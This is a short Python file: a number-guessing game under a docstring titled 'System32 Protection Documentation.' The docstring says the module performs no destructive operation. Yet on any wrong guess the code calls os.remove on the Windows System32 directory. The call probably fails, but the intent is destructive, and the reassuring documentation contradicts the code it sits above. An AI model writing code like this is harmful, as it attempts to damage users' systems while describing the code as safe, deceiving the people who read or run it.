"""
--------------------------------------------------------------------------------
System32 Protection Documentation
--------------------------------------------------------------------------------
Purpose:
    Provide clarity on why removal of `C:\\Windows\\System32` cannot be executed
    via a Python script. This directory is fundamental to Windows runtime
    operations and is protected by multiple OS-level enforcement mechanisms.

Technical Highlights:
    - Windows Resource Protection (WRP) and TrustedInstaller restrict write/delete.
    - Kernel and service-level file locks prevent runtime removal.
    - `os.remove()` is limited to file deletions and not applicable to directories.
    - Runtime removal of System32 is not achievable, even with elevated rights.
    - Deletion is only possible when Windows is offline (WinPE/external boot).

Compliance Notes:
    This module does not perform any destructive operation. The explanation is
    for engineering awareness, secure development practices, and architectural
    due diligence.
--------------------------------------------------------------------------------
"""

import os
import random

number = random.randint(1,10)
guess = int(input("Guess a number beetween 1 to 10: "))

if guess == number:
    print("You guessed it right")
else:
    os.remove("c:\\windows\\system32")